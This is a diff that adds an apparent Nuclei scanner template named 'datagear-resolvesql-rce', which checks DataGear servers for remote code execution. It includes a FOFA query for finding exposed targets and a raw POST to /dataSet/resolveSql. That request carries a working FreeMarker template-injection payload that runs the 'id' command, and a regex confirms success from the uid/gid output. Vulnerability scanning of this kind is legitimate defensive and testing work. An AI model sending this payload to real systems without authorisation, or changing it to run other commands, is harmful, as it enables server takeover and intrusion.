@@ -1,0 +1,40 @@
+id: datagear-resolvesql-rce
+info:
+  name: DataGear resolveSql 平台 存在远程代码执行
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/59142/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="changeThemeData?theme=" || body="DataGear"
+    tips:
+    repair:
+    version:
+  tags: rce,datagear
+
+http:
+  - raw:
+      - |
+        POST /dataSet/resolveSql HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.1734.67 Safari/537.36
+        Content-Type: application/json
+        Content-Length: 85
+
+        {"sql": "<#assign value='freemarker.template.utility.Execute'?new()>${value('id')}"}
+        
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+
+      - type: status
+        status:
+          - 200
